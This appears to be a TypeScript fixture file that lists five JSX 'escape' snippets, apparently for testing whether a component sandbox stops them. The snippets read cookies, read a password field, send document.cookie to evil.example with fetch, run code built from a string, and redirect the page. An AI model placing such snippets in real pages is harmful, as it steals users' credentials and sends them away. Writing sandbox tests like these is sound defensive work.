export interface Escape {
  id: string;
  title: string;
  js: string;
}

export const ESCAPES: Escape[] = [
  {
    id: "read-cookie",
    title: "Read the page's cookies",
    js: `export default function Cookie() {
  return <p>{document.cookie}</p>;
}`,
  },
  {
    id: "read-dom",
    title: "Read a password field on the page",
    js: `export default function Steal() {
  const field = document.querySelector("input[type=password]");
  return <p>{field.value}</p>;
}`,
  },
  {
    id: "network-out",
    title: "Send a request to another server",
    js: `export default function Send() {
  fetch("https://evil.example/collect?c=" + document.cookie);
  return <p>sent</p>;
}`,
  },
  {
    id: "run-script",
    title: "Run code from a string",
    js: `export default function Run() {
  const run = new Function("return document.cookie");
  return <p>{run()}</p>;
}`,
  },
  {
    id: "navigate",
    title: "Send the page somewhere else",
    js: `export default function Leave() {
  window.location.href = "https://evil.example";
  return <p>bye</p>;
}`,
  },
];
